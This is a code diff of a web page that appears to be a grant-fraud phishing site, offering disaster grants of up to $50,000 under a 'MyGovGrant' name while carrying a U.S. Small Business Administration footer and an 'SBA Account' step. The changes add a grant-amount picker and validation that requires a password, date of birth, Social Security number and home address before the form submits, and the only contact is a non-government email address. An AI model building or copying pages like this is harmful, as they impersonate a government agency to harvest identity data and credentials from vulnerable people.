@@ -13,10 +13,11 @@
 <body class="font-sans antialiased">
 
     <!-- Navbar -->
-    <nav class="bg-white bg-opacity-800 p-4">
+    <nav class="bg-white p-4 shadow">
         <div class="container mx-auto flex items-center justify-between">
-            <div class="flex items-center justify-between w-full md:w-auto">
+            <a href="index.html">
                 <img src="Vision pro base (1).png" alt="Crypto Brand Logo" class="h-12">
+            </a>
 
                 <!-- Mobile Menu Button -->
                 <div class="md:hidden ml-auto">
@@ -58,6 +59,35 @@
         </div>
     </div>
 
+    <!-- Grant Request Form -->
+    <div id="grantRequestForm" class="hidden max-w-3xl w-full space-y-8 bg-white shadow-lg rounded-lg p-8">
+        <div class="text-center">
+            <h2 class="text-3xl font-extrabold text-gray-900 mb-4">Grant Request Amount</h2>
+            <p class="text-sm text-gray-600 mb-6">
+                Please select your grant request amount from the options below.
+            </p>
+        </div>
+        <form id="grantForm">
+            <div>
+                <label for="grantAmount" class="block text-sm font-medium text-gray-700">Select Amount</label>
+                <select id="grantAmount" name="grantAmount" required class="mt-1 p-2 w-full border border-gray-300 rounded-md shadow-sm focus:ring-blue-500 focus:border-blue-500">
+                    <option value="">-- Select Amount --</option>
+                    <option value="1000">$1,000</option>
+                    <option value="5000">$5,000</option>
+                    <option value="10000">$10,000</option>
+                    <option value="20000">$20,000</option>
+                    <option value="30000">$30,000</option>
+                    <option value="40000">$40,000</option>
+                    <option value="50000">$50,000</option>
+                </select>
+            </div>
+            <div class="flex justify-center mt-4">
+                <button type="submit" class="px-4 py-2 bg-blue-500 text-white rounded-lg hover:bg-blue-600">Submit Request</button>
+            </div>
+        </form>
+    </div>
+
+
     <script>
         window.onload = function() {
             const splashScreen = document.getElementById('splash-screen');
@@ -93,6 +123,7 @@
     </script>
 </body>
 
+
 <!-- Container -->
 <div class="min-h-screen flex items-center justify-center bg-blue-900 py-12 px-4 sm:px-6 lg:px-8">
     <div class="max-w-3xl w-full space-y-8 bg-white shadow-lg rounded-lg p-8">
@@ -108,7 +139,7 @@
             </p>
 
             <p class="text-sm text-gray-600 mb-8">
-                Vision pro base investment ltb in partnership with the MyGovGrant for disaster individuals is dedicated
+                Vision pro base investment Ltb in partnership with the MyGovGrant for disaster individuals is dedicated
                 to protecting your data, the steps required to register and sign in are necessary to ensure your data will
                 stay safe with us  
             </p>
@@ -194,7 +225,7 @@
                 </div>
             </div>
 
-            <!-- Step 3: MyGovGrant Account -->
+            <!-- Step 3: SBA Account -->
             <div id="step-3" class="hidden space-y-4">
                 <h3 class="text-sm font-bold text-gray-700">MyGovGrant Account</h3>
                 <p class="text-xs text-gray-500 mb-4">You can view or manage your MyGovGrant Loan Accounts on your dashboard.</p>
@@ -219,27 +250,26 @@
 
             <!-- Navigation Buttons -->
             <div class="flex justify-between mt-6">
-                <button id="prevBtn" type="button" class="bg-gray-300 text-gray-700 px-4 py-2 rounded-md hover:bg-gray-400 hidden" onclick="prevStep()">Previous</button>
-                <button id="nextBtn" type="button" class="bg-red-600 text-white px-4 py-2 rounded-md hover:bg-red-700" onclick="nextStep()">Next Step</button>
+                <button id="prevBtn" type="button" class="bg-gray-300 text-gray-700 px-4 py-2 w-full hover:bg-gray-400 hidden" onclick="prevStep()">Previous</button>
+                <button id="nextBtn" type="button" class="bg-red-600 text-white px-4 py-2 w-full hover:bg-red-700" onclick="nextStep()">Next Step</button>
             </div>
         </form>
     </div>
 </div>
 
 
-
-        <!-- Footer Section -->
-        <div class="mt-8 border-t pt-6 text-center text-gray-500 text-xs">
-            <p>U.S. Small Business Administration</p>
-            <p>409 3rd St, SW. Washington DC 20416</p>
-            <p class="mt-2">
-                <a href="mailto:Info@visionprobase.tech" class="text-blue-600 hover:underline">Info@visionprobase.tech</a> | <a href="#" class="text-blue-600 hover:underline">Accessibility</a>
-            </p>
-        </div>
+     <!-- Footer Section -->
+     <div class="mt-8 border-t pt-6 text-center text-gray-500 text-xs">
+        <p>U.S. Small Business Administration</p>
+        <p>409 3rd St, SW. Washington DC 20416</p>
+        <p class="mt-2">
+            <a href="mailto:Info@visionprobase.tech" class="text-blue-600 hover:underline">Info@visionprobase.tech</a> | <a href="https://www.sba.gov/about-sba/open-government/about-sbagov-website/accessibility" class="text-blue-600 hover:underline">Accessibility</a>
+        </p>
     </div>
 </div>
+</div>
 
-
+<!-- JavaScript for Multi-Step Form -->
 <script>
     let currentStep = 1;
 
@@ -260,11 +290,19 @@
     }
 
     function nextStep() {
-        if (currentStep < 3) {
-            currentStep++;
-            showStep(currentStep);
+        if (currentStep === 1) {
+            if (validateStep1()) {
+                currentStep++;
+                showStep(currentStep);
+            }
+        } else if (currentStep === 2) {
+            if (validateStep2()) {
+                currentStep++;
+                showStep(currentStep);
+            }
         } else {
-            document.getElementById('multiStepForm').submit(); // Simulate form submission
+            // On the last step, submit the form
+            document.getElementById('multiStepForm').submit();
         }
     }
 
@@ -275,9 +313,35 @@
         }
     }
 
+    // Validation Functions
+    function validateStep1() {
+        const fields = ['fullName', 'email', 'password', 'confirmPassword', 'homePhone', 'mobilePhone'];
+        return validateFields(fields);
+    }
+
+    function validateStep2() {
+        const fields = ['dob', 'ssn', 'confirmSsn', 'homeAddress', 'city', 'state', 'zipCode', 'country'];
+        return validateFields(fields);
+    }
+
+    function validateFields(fieldNames) {
+        let isValid = true;
+        fieldNames.forEach(fieldName => {
+            const field = document.getElementById(fieldName);
+            if (!field.value.trim()) {
+                isValid = false;
+                field.classList.add('border-red-500');
+                field.classList.remove('border-gray-300');
+            } else {
+                field.classList.remove('border-red-500');
+                field.classList.add('border-gray-300');
+            }
+        });
+        return isValid;
+    }
+
     // Initialize form on step 1
     showStep(1);
 </script>
-
 </body>
 </html>
